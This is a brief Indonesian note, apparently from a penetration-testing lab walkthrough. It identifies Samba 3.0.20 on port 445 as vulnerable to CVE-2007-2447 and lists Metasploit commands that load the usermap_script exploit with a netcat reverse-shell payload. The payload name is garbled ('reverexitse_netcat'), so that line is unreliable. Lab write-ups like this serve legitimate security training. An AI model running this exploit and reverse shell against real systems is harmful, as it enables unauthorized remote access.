---
title: Port 445 - Samba
updated: 2025-12-17 02:14:33Z
created: 2025-12-17 01:37:20Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

Port 445 yang menjalankan Samba 3.0.20. Setelah melakukan riset dasar, saya menemukan kerentanan (CVE 2007-2447): http://www.cvedetails.com/cve/cve-2007-2447. Mari kita jalankan Metasploit dan lihat apakah itu berhasil:

\$ use exploit/multi/samba/usermap_script

\$ set PAYLOAD cmd/unix/reverexitse_netcat